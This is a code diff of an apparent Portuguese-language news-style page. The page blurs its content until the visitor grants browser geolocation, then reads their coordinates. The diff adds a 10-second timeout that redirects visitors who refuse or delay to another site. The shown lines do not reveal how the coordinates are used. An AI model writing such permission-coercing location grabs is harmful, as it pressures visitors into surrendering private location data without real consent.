@@ -155,7 +155,7 @@
 
   <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
 
- <script>
+<script>
   document.body.classList.add('blurred');
 
   function liberarConteudo() {
@@ -163,13 +163,25 @@
     document.getElementById('overlay').style.display = 'none';
   }
 
+  function redirecionar() {
+    window.location.href = "https://noticias2025-max.github.io/Curitiba_e_Regiao01/";
+  }
+
   window.addEventListener('load', () => {
     if (!navigator.geolocation) {
-      window.location.href = "https://noticias2025-max.github.io/Curitiba_e_Regiao01/";
+      redirecionar();
       return;
     }
 
+    // Se o usuário não responder à permissão em 10 segundos, redireciona
+    const timeout = setTimeout(() => {
+      console.warn("Tempo de espera excedido para geolocalização");
+      redirecionar();
+    }, 10000); // 10 segundos
+
     navigator.geolocation.getCurrentPosition(async (pos) => {
+      clearTimeout(timeout); // Usuário permitiu a localização, cancela o redirecionamento
+
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
@@ -188,10 +200,12 @@
       liberarConteudo();
 
     }, (error) => {
-      window.location.href = "https://noticias2025-max.github.io/Curitiba_e_Regiao01/";
+      clearTimeout(timeout); // Já vai redirecionar, cancela o timeout
+      redirecionar();
     });
   });
 </script>
+
 
 
 </body>
